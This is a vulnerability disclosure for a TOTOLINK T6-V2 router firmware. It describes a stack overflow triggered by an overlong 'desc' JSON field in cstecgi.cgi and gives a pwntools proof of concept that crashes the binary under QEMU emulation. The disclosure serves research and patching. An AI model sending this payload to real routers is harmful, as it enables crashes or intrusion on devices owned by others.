## Overview

- The device's official website: http://www.totolink.cn/home/menu/detail.html?menu_listtpl=products&id=16&ids=33
- Firmware download website: http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=16&ids=36

## Affected version

T6-V2 V4.1.9cu.5179_B20201015

## Vulnerability details

The vulnerability exists in the router's WEB component. `/web_cste/cgi-bin/cstecgi.cgi` `FUN_00412ef4` (at address 0x412ef4) gets the JSON parameter `desc`, but without checking its length, copies it directly to local variables in the stack, causing stack overflow: 

<img src="img/image-20220529095338996.png" alt="image-20220529095338996" style="zoom:67%;" />

When parameter `addEffect` is equal to `1`, the program will enter the if branch at line 54.

<img src="img/image-20220529095501694.png" alt="image-20220529095501694" style="zoom:67%;" />

In the red box, program copies `desc` to the stack buffer without checking its length.

## PoC



```python
from pwn import *
import json

data = {
    "topicurl": "setting/setIpPortFilterRules",
    "addEffect": "1",
    "ip": "192.168.1.1",
    "proto": "UDP",
    "sPort": "9999",
    "dPort": "9999",
    "desc": 'A'*0x400
}

data = json.dumps(data)
print(data)

argv = [
    "qemu-mipsel-static",
    "-L", "./root/",
    "-E", "CONTENT_LENGTH={}".format(len(data)),
    "-E", "REMOTE_ADDR=192.168.2.1",
    "./cstecgi.cgi"
]

a = process(argv=argv)
a.sendline(data.encode())

a.interactive()
```

<img src="img/image-20220529095742244.png" alt="image-20220529095742244" style="zoom:67%;" align = "left"/>
